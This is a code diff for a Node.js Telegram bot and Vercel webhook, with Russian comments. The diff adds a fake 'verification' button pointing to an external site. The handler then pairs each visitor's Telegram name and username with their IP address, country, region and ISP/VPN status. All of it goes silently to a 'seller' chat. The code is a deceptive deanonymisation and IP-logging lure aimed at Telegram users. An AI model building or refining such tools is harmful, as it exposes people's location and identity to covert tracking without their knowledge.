@@ -8,30 +8,25 @@ const VPNAPI_KEY = process.env.VPNAPI_KEY;
 
 const bot = new Telegraf(BOT_TOKEN);
 
-// --- Хранилище пользователей Telegram ---
+// --- Хранилище Telegram пользователей ---
 const users = {};
 
 // --- Команда /start ---
 bot.start((ctx) => {
-  ctx.reply('Привет! Для проверки, пожалуйста, откройте сайт через браузер и отправьте данные.');
   const id = ctx.from.id;
   users[id] = {
     username: ctx.from.username || '',
     firstName: ctx.from.first_name || '',
     lastName: ctx.from.last_name || ''
   };
-});
 
-// --- Любое сообщение сохраняем ---
-bot.on('message', (ctx) => {
-  const id = ctx.from.id;
-  if (!users[id]) {
-    users[id] = {
-      username: ctx.from.username || '',
-      firstName: ctx.from.first_name || '',
-      lastName: ctx.from.last_name || ''
-    };
-  }
+  ctx.reply('Привет! Для продолжения проверки нажми кнопку ниже:', {
+    reply_markup: {
+      inline_keyboard: [
+        [{ text: 'Открыть сайт для проверки', url: 'https://check-secure.vercel.app' }]
+      ]
+    }
+  });
 });
 
 // --- Webhook handler для Vercel ---
@@ -41,14 +36,18 @@ export default async function handler(req, res) {
   try {
     const body = await parseJson(req);
 
-    // Получаем Telegram данные
+    // Telegram данные
     const tgData = users[body.telegramId] || { username: '', firstName: '', lastName: '' };
 
-    // IP и гео
+    if (!tgData.firstName) {
+      return res.status(400).json({ error: 'Telegram данные не найдены' });
+    }
+
+    // --- IP и Geo ---
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
     const geo = geoip.lookup(ip);
 
-    // VPN/ISP инфо через VPNAPI
+    // --- VPN/ISP через VPNAPI ---
     let isp = 'неизвестно';
     let vpnWarning = '';
     try {
@@ -62,13 +61,14 @@ export default async function handler(req, res) {
         }
       }
     } catch (e) {
-      console.error('Ошибка VPNAPI:', e);
+      console.error('VPNAPI error:', e);
     }
 
+    // --- Формируем сообщение ---
     const message = `
 🟢 *Новый пользователь*
 
-👤 Telegram: ${tgData.firstName || ''} ${tgData.lastName || ''} (@${tgData.username})
+👤 Telegram: ${tgData.firstName} ${tgData.lastName} (@${tgData.username})
 🌍 IP: ${ip}
 📌 Страна: ${geo?.country || 'неизвестно'}
 🏙 Регион: ${geo?.region || 'неизвестно'}
@@ -83,6 +83,7 @@ ${vpnWarning}
 `;
 
     await bot.telegram.sendMessage(SELLER_CHAT_ID, message, { parse_mode: 'Markdown' });
+
     res.status(200).json({ status: 'ok' });
 
   } catch (err) {
@@ -91,7 +92,7 @@ ${vpnWarning}
   }
 }
 
-// --- Парсинг JSON ---
+// --- JSON парсер ---
 async function parseJson(req) {
   return new Promise((resolve, reject) => {
     let body = '';
